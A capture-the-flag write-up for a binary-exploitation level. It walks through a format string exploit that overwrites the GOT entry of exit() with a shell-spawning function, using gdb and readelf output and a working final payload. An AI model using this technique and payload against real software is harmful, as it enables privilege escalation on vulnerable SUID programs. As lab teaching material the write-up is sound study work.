# level5
- This program has the same vulnerability as the previous two levels: __format string vulnerability__., 
- A function named `o` runs a shell, but is never called
- `main()` calls `n()` then returns.
- `n()` finishes calling `exit()`. it is a subroutine that doen't return. So we can't overwrite the return address of `n` to point to `o`.

## Goal
Modify the call of `exit()` by the call of `o()`

## Step 1
`exit()` is called through the __PLT (Procedure Linkage Table)__ resolution. __PLT__ enters in the __GOT__ on `exit()`
```console
Dump of assembler code for function n:
   [...]
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
```

It's mean that `exit` is a dependecy of the program (extern), which is bind to the program thanks to the __PLT__ and __GOT__ mechanism (like libc), the purpose is to reduce size of the binary. __GOT__ is a table where we can find the dependencies addresses.


Since __PIE__ is disabled, the __GOT__ is always at the same address.

We can overwrite the __GOT__ entry of `exit()` with the address of `o()` thanks to the __format string vulnerability__.

## Step 2

```bash
(gdb) p &o
$1 = (<text variable, no debug info> *) 0x80484a4 <o>
--- OR ---
objdump -t level5
080484a4 g     F .text	0000001e              o
```
`o` is at `0x80484a4`

---

```bash
$ readelf -r level5 | grep exit
08049828  00000207 R_386_JUMP_SLOT   00000000   _exit
08049838  00000607 R_386_JUMP_SLOT   00000000   exit
```

`exit` is at `0x08049838`

### Notice
> viewed before:
```console
0x080484ff <+61>:	call   0x80483d0 <exit@plt>
```  
> 0x80483d0 is not the address of `exit`, it's the address of the __PLT__ entry of `exit`
>
```bash
(gdb) disas 0x80483d0  
Dump of assembler code for function exit@plt:  
   0x080483d0 <+0>:	jmp    *0x8049838  
   0x080483d6 <+6>:	push   $0x28  
   0x080483db <+11>:	jmp    0x8048370  
End of assembler dump.  
(gdb)
```
> the `exit` __PLT__ entry jumps to  `0x8049838`, the __GOT__ entry of `exit`


## Step 3
Lets try to overwrite the __GOT__ entry of `exit` with the address of `o`

```bash
$ gdb level5
(gdb) b *main
(gdb) r
(gdb) set {int}0x8049838=0x80484a4
(gdb) c
$ whoami
level5
(gdb)
```

It works, we have a shell with the user `level5` privileges. (gdb run with the same privileges as the user not the SUID bit permissions)


## step 4

We have to leaks the memory until we reach the address of `exit()`

```bash
(python -c 'print "AAAA " + "%x " * 10000'; cat)  | /home/user/level5/level5 | grep 8049838
```
We never reach the address of `exit()`. But we reach the buffer

```bash
(python -c 'print "AAAA " + "%x " * 16'; cat)  | /home/user/level5/level5
```
```console
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
```

Buffer is at the 4th position

## Exploit


Write the address of `exit` in the buffer and modify it by the value of `o` thanks to `%n` when `printf` access to the buffer.



```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"'; cat)  | /home/user/level5/level5
```

- >  134513824 is the decimal value for 0x80484A4
